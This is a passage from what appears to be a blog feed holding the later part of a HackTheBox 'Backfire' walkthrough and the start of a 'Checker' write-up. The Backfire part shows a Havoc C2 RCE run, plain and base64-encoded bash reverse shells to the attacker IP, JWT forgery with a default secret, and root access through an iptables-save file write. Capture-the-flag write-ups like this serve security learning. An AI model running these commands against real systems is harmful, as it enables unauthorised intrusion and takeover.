class="p">)</span> </code></pre></div></div> <h4 id="execution">Execution</h4> <p>I’ll run this with a simple <code class="language-plaintext highlighter-rouge">ping</code> command to see if it works, using the creds from the <a href="/2025/06/07/htb-backfire.html#http---tcp-8000">config above</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> rce.py requests pycryptodome <span class="go">Updated `rce.py` </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> rce.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 127.0.0.1 <span class="nt">-p</span> 40056 <span class="nt">-U</span> ilya <span class="nt">-P</span> <span class="s1">'CobaltStr1keSuckz!'</span> <span class="nt">-c</span> <span class="s1">'ping -c 1 10.10.14.6'</span> <span class="go">Installed 6 packages in 9ms [***] Trying to register agent... [***] Success! [***] Trying to open socket on the teamserver... [***] Success! [***] Trying to write to the socket ...[snip]... </span></code></pre></div></div> <p>At <code class="language-plaintext highlighter-rouge">tcpdump</code>, there’s ICMP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp <span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 15:45:42.762075 IP 10.10.11.49 &gt; 10.10.14.6: ICMP echo request, id 6302, seq 1, length 64 15:45:42.762109 IP 10.10.14.6 &gt; 10.10.11.49: ICMP echo reply, id 6302, seq 1, length 64 </span></code></pre></div></div> <p>That’s RCE!</p> <h4 id="shell">Shell</h4> <p>I’ll try <code class="language-plaintext highlighter-rouge">-c 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"'</code>, but it doesn’t work. That’s not surprising, given the amount of times the data is processed and passed on and the special characters. I’ll base64 encode that payload:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</span> | <span class="nb">base64</span> <span class="go">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg== </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</span> | <span class="nb">base64</span> <span class="go">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo= </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1 '</span> | <span class="nb">base64</span> <span class="go">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK </span></code></pre></div></div> <p>Any of these would probably work, but I like to add spaces to get rid of special characters.</p> <p>Now I’ll send this as the payload:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run rce.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 127.0.0.1 <span class="nt">-p</span> 40056 <span class="nt">-U</span> ilya <span class="nt">-P</span> <span class="s1">'CobaltStr1keSuckz!'</span> <span class="nt">-c</span> <span class="s1">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash'</span> <span class="go">...[snip]... </span></code></pre></div></div> <p>It works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443 <span class="go">Listening on 0.0.0.0 443 Connection received on 10.10.11.49 40244 bash: cannot set terminal process group (6324): Inappropriate ioctl for device bash: no job control in this shell </span><span class="gp">ilya@backfire:~/Havoc/payloads/Demon$</span><span class="w"> </span></code></pre></div></div> <p>I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt <span class="go">886b281d************************ </span></code></pre></div></div> <h4 id="ssh">SSH</h4> <p>The shell is a bit flaky, dying sometimes without warning. I’ll add an SSH key to <code class="language-plaintext highlighter-rouge">/home/ilya/.ssh/authorized_keys</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"</span> <span class="o">&gt;&gt;</span> .ssh/authorized_keys </code></pre></div></div> <p>And now connect using SSH:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen ilya@10.10.11.49 <span class="go">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64 </span><span class="gp">ilya@backfire:~$</span><span class="w"> </span></code></pre></div></div> <h2 id="shell-as-sergej">Shell as sergej</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="home-directories">Home Directories</h4> <p>In ilya’s home directory there are a few files besides <code class="language-plaintext highlighter-rouge">user.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">files hardhat.txt Havoc user.txt </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">files</code> has the same files as what’s hosted on the port 8000 webserver. <code class="language-plaintext highlighter-rouge">Havoc</code> is the installation of Havoc. <code class="language-plaintext highlighter-rouge">hardhat.txt</code> says:</p> <blockquote> <p>Sergej said he installed HardHatC2 for testing and not made any changes to the defaults I hope he prefers Havoc bcoz I don’t wanna learn another C2 framework, also Go &gt; C#</p> </blockquote> <p>There is a <code class="language-plaintext highlighter-rouge">sergej</code> directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">ilya sergej </span></code></pre></div></div> <p>ilya doesn’t have access. These users match the users with shells in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span> <span class="go">root:x:0:0:root:/root:/bin/bash ilya:x:1000:1000:ilya,,,:/home/ilya:/bin/bash sergej:x:1001:1001:,,,:/home/sergej:/bin/bash </span></code></pre></div></div> <h4 id="network">Network</h4> <p>There are many listening ports:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:/$</span><span class="w"> </span>netstat <span class="nt">-tnl</span> <span class="go">Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:7096 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:40056 0.0.0.0:* LISTEN tcp6 0 0 :::22 :::* LISTEN </span></code></pre></div></div> <ul> <li>8000 is the webserver serving files from <code class="language-plaintext highlighter-rouge">/var/www/files</code> (as can be seen in <code class="language-plaintext highlighter-rouge">/etc/nginx/conf.d/tcp_8000.conf</code>)</li> <li>8443 is where Havoc is actually listening, and nginx is forwarding it from 443 (as can be seen in <code class="language-plaintext highlighter-rouge">/etc/nginx/conf.d/havoc.conf</code>).</li> <li>5000 and 7096 were filtered from the outside, so I’ll want to look at these.</li> <li>443 is the outward-facing Havoc server.</li> <li>22 is SSH</li> <li>40056 is the Havoc management port.</li> </ul> <h4 id="processes">Processes</h4> <p>The most interesting processes at this point belong to sergej, who is running Hardhat:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:/$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>sergej <span class="go">sergej 6921 3.0 6.5 274271224 259772 ? Ssl 16:00 0:12 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release sergej 6922 2.6 6.4 274262820 258032 ? Ssl 16:00 0:11 /home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release sergej 6979 2.1 3.3 274203412 131524 ? Sl 16:00 0:08 /home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer sergej 6992 1.2 3.2 274195036 131112 ? Sl 16:00 0:05 /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client </span></code></pre></div></div> <h3 id="hardhat">Hardhat</h3> <h4 id="local">Local</h4> <p><a href="https://github.com/DragoQCC/HardHatC2">Hardhat C2</a> is an open source C# C2 framework. The note from ilya says that sergej didn’t change anything. The default config file is located <a href="https://github.com/DragoQCC/HardHatC2/blob/74a86e6680309c7e192826a7ceff6642501e81a7/TeamServer/appsettings.json">here</a>:</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w"> </span><span class="nl">"Logging"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"LogLevel"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"Default"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Information"</span><span class="p">,</span><span class="w"> </span><span class="nl">"Microsoft"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Warning"</span><span class="p">,</span><span class="w"> </span><span class="nl">"Microsoft.Hosting.Lifetime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Information"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nl">"AllowedHosts"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w"> </span><span class="nl">"Jwt"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"Key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jtee43gt-6543-2iur-9422-83r5w27hgzaq"</span><span class="p">,</span><span class="w"> </span><span class="nl">"Issuer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hardhatc2.com"</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nl">"IPWhitelistOptions"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"Whitelist"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">"*"</span><span class="p">]</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="p">}</span><span class="w"> </span></code></pre></div></div> <p>The JWT secret is hardcoded. If it wasn’t modified, I can forge an account.</p> <p>I’ll clone the repo and run <code class="language-plaintext highlighter-rouge">docker compose up</code> to get a local copy running. It tells me the servers are running on 5000 and 7096, and then gives the login information for this instance:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">hardhat_server | Username: HardHat_Admin hardhat_server | Password: p3svHI=s-R@*7DfRr*u5 </span></code></pre></div></div> <p>I’ll open <code class="language-plaintext highlighter-rouge">https://localhost:7096</code> and log in with those creds.</p> <p>There’s not a ton going on here, but the “Admin Dashboard” does allow me to create a new user:</p> <picture> <source type="image/webp" srcset="/img/image-20250124162105885.webp" /> <img loading="lazy" src="/img/image-20250124162105885.png" alt="image-20250124162105885" class="include_image " /> </picture> <p>Logging in as this user, there’s a ton more functionality, including a terminal:</p> <picture> <source type="image/webp" srcset="/img/image-20250124162317629.webp" /> <img loading="lazy" src="/img/image-20250124162317629.png" alt="image-20250124162317629" class="include_image " /> </picture> <p>I can list the local Docker hostname and user.</p> <h4 id="token">Token</h4> <p>Before shutting down my Docker container, I’ll look at how the tokens are stored. There’s no cookies for the site, but there are values in Local Storage:</p> <picture> <source type="image/webp" srcset="/img/image-20250124162430127.webp" /> <img loading="lazy" src="/img/image-20250124162430127.png" alt="image-20250124162430127" class="include_image " /> </picture> <p>I’ll log out as 0xdf and back in as HardHat_Admin. This user should exist on Backfire as well, and if the JWT secrets are the same, then the token generated here will work there as well:</p> <picture> <source type="image/webp" srcset="/img/image-20250124162551833.webp" /> <img loading="lazy" src="/img/image-20250124162551833.png" alt="image-20250124162551833" class="include_image " /> </picture> <h4 id="remote">Remote</h4> <p>I’ll kill the Docker and add SSH tunnels to access ports 5000 and 7096:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen ilya@10.10.11.49 <span class="nt">-L</span> 5000:127.0.0.1:5000 <span class="nt">-L</span> 7096:127.0.0.1:7096 <span class="go">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64 ...[snip]... </span><span class="gp">ilya@backfire:~$</span><span class="w"> </span></code></pre></div></div> <p>Now when I open <code class="language-plaintext highlighter-rouge">https://127.0.0.1:7096/Settings</code>, it loads! I didn’t even have to change the cookies since both sites were accessed at the same place. Because the same shared secret is in use, the token just works.</p> <picture> <source type="image/webp" srcset="/img/image-20250124162826075.webp" /> <img loading="lazy" src="/img/image-20250124162826075.png" alt="image-20250124162826075" class="include_image " /> </picture> <p>I’ll create a user with Team Lead role and log in. At the terminal, I’ll see the hostname:</p> <picture> <source type="image/webp" srcset="/img/image-20250124163007485.webp" /> <img loading="lazy" src="/img/image-20250124163007485.png" alt="image-20250124163007485" class="include_image " /> </picture> <p>I’ll issue a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250124163052440.webp" /> <img loading="lazy" src="/img/image-20250124163052440.png" alt="image-20250124163052440" class="include_image " /> </picture> <p>It connects to my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443 <span class="go">Listening on 0.0.0.0 443 Connection received on 10.10.11.49 58572 bash: cannot set terminal process group (8128): Inappropriate ioctl for device bash: no job control in this shell </span><span class="gp">sergej@backfire:~/HardHatC2/HardHatC2Client$</span><span class="w"> </span></code></pre></div></div> <p>I’ll upgrade the shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:~$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash <span class="go">script /dev/null -c bash Script started, output log file is '/dev/null'. </span><span class="gp">sergej@backfire:~$</span><span class="w"> </span>^Z <span class="go">[1]+ Stopped nc -lnvp 443 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> <span class="go">nc -lnvp 443 reset reset: unknown terminal type unknown Terminal type? screen </span><span class="gp">sergej@backfire:~$</span><span class="w"> </span></code></pre></div></div> <h2 id="shell-as-root">Shell as root</h2> <h3 id="enumeration-1">Enumeration</h3> <p>sergej has <code class="language-plaintext highlighter-rouge">sudo</code> permissions to run <code class="language-plaintext highlighter-rouge">iptables</code> and <code class="language-plaintext highlighter-rouge">iptables-save</code> as root on Backfire:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> <span class="go">Matching Defaults entries for sergej on backfire: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty User sergej may run the following commands on backfire: (root) NOPASSWD: /usr/sbin/iptables (root) NOPASSWD: /usr/sbin/iptables-save </span></code></pre></div></div> <h3 id="file-write">File Write</h3> <h4 id="strategy-2">Strategy</h4> <p><code class="language-plaintext highlighter-rouge">man iptables-save</code> shows there’s a <code class="language-plaintext highlighter-rouge">-f</code> option:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:~$</span><span class="w"> </span>man iptables-save <span class="go">...[snip]... -f, --file filename Specify a filename to log the output to. If not specified, ipta‐ bles-save will log to STDOUT. ...[snip]... </span></code></pre></div></div> <p>This means I can write as root if I can get what I want to write into an iptables rule.</p> <h4 id="write-comment">Write Comment</h4> <p><a href="https://www.cyberciti.biz/faq/how-to-add-comments-to-iptables-rules-on-linux/">This article</a> shows how to put a comment into an iptables rule. I’ll test it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-m</span> comment <span class="nt">--comment</span> <span class="s2">"test"</span> <span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables-save <span class="c"># Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:41:42 2025 </span><span class="go">*filter :INPUT ACCEPT [5331:11868675] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [6968:23797449] -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable -A INPUT -i lo -m comment --comment test COMMIT </span><span class="c"># Completed on Fri Jan 24 16:41:42 2025 </span></code></pre></div></div> <p>I would like the comment to start on a new line. I’ll add a new line:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-m</span> comment <span class="nt">--comment</span> <span class="s1">$'</span><span class="se">\n</span><span class="s1">test</span><span class="se">\n</span><span class="s1">'</span> <span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables-save <span class="c"># Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:42:32 2025 </span><span class="go">*filter :INPUT ACCEPT [130:28055] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [174:35449] -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable -A INPUT -i lo -m comment --comment "test" -A INPUT -i lo -m comment --comment " test " COMMIT </span><span class="c"># Completed on Fri Jan 24 16:42:32 2025 </span></code></pre></div></div> <p>That works!</p> <h4 id="write-ssh-key">Write SSH Key</h4> <p>I’ll write my public SSH key into a comment:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-m</span> comment <span class="nt">--comment</span> <span class="s1">$'</span><span class="se">\n</span><span class="s1">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing</span><span class="se">\n</span><span class="s1">'</span> </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">authorized_keys</code> files ignore lines that don’t match the required format, so as long as I get my key onto its own line, it should work:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">@backfire:/$ </span><span class="nb">sudo </span>iptables-save <span class="c"># Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:43:48 2025 </span><span class="go">*filter :INPUT ACCEPT [227:81030] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [436:104924] -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable -A INPUT -i lo -m comment --comment "\\ntest\\n" -A INPUT -i lo -m comment --comment " test " -A INPUT -i lo -m comment --comment " ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing " COMMIT </span><span class="c"># Completed on Fri Jan 24 16:43:48 2025 </span></code></pre></div></div> <p>I’ll save that to root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables-save <span class="nt">-f</span> /root/.ssh/authorized_keys </code></pre></div></div> <p>And connect with SSH:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.10.11.49 <span class="go">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64 </span><span class="gp">root@backfire:~# </span><span class="w"> </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-backfire"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="hackthebox"/>
<category term="ctf"/>
<category term="htb-backfire"/>
<category term="nmap"/>
<category term="debian"/>
<category term="havoc"/>
<category term="cve-2024-41570"/>
<category term="ssrf"/>
<category term="ssrf-websocket"/>
<category term="chat-gpt"/>
<category term="hardhatc2"/>
<category term="docker"/>
<category term="jwt"/>
<category term="jwt-default-secret"/>
<category term="iptables"/>
<category term="iptables-save"/>
<category term="arbitrary-write"/>
<summary type="html">
<![CDATA[ Backfire is all about exploiting red team infrastructure, first Havoc, and then HardHatC2. I’ll start with a Havoc server and leak the configuration from the website. I’ll exploit an SSRF vulnerability to get access to the admin port internally. There’s an authenticated RCE vulnerability on this port, but it involves sending payloads into a websocket. I’ll create a chained exploit using the SSRF to stand up and communicate over a websocket to get command injection and a shell. From here, I’ll find an instance of HardHatC2, and exploit the default JWT secret to forge cookies and get access. Inside the C2 admin panel, I’ll get a shell as the next user. Finally, I’ll abuse a sudo rule that allows saving the firewall rules to get arbitrary write, and get a shell as root. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/backfire-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/backfire-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Checker</title>
<link href="https://0xdf.gitlab.io/2025/05/31/htb-checker.html" rel="alternate" type="text/html" title="HTB: Checker"/>
<published>2025-05-31T13:45:00+00:00</published>
<updated>2025-05-31T13:45:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/05/31/htb-checker</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/05/31/htb-checker.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/checker-cover.webp" /> <img loading="lazy" src="/img/checker-cover.png" alt="Checker" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Checker starts with instances of BookStack and Teampass. Without creds to either, I’ll find an SQL injection vulnerability in Teampass and leak user hashes. One cracks, and let’s me in, revealing both BookStack and SSH creds. SSH has two factor enabled. In BookStack, I’ll exploit an SSRF with a very tricky blind PHP filter oracle to read the two factor seed from a backup, and get a shell on the box. For root, I’ll exploit a binary that uses shared memory to look for compromised hashes, and poison that memory in a race condition to get execution as root.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/649 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/checker" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Checker</a> <a href="https://hackthebox.com/machines/checker" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-checker.webp" /> <img src="/icons/box-checker.png" alt="Checker" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/checker" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1892620284022169789">22 Feb 2025</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">31 May 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td> </tr> <tr> <td>Rated Difficulty</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/checker-diff.webp" /><img src="/img/checker-diff.png" alt="Rated difficulty for Checker" style="display: unset;" /></picture></td> </tr> <tr> <td>Radar Graph</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/checker-radar.webp" /><img src="/img/checker-radar.png" alt="Radar chart for Checker" style="display: unset;" /></picture></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">00:59:27</span><a href="https://app.hackthebox.com/users/114435" target="_blank" rel="noopener"><img alt="celesian" src="https://www.hackthebox.com/badge/image/114435" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> celesian</span></a><br /></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">01:29:58</span><a href="https://app.hackthebox.com/users/114435" target="_blank" rel="noopener"><img alt="celesian" src="https://www.hackthebox.com/badge/image/114435" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> celesian</span></a><br /></td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/143843" target="_blank" rel="noopener"><img alt="0xyassine" src="https://www.hackthebox.com/badge/image/143843" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> 0xyassine</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="nmap">nmap</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22) and two HTTP (80, 8080):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.56 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 15:48 EST Nmap scan report for 10.10.11.56 Host is up (0.089s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,8080 <span class="nt">-sCV</span> 10.10.11.56 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 15:48 EST Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 33.33% done; ETC: 15:49 (0:00:12 remaining) Nmap scan report for 10.10.11.56 Host is up (0.085s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 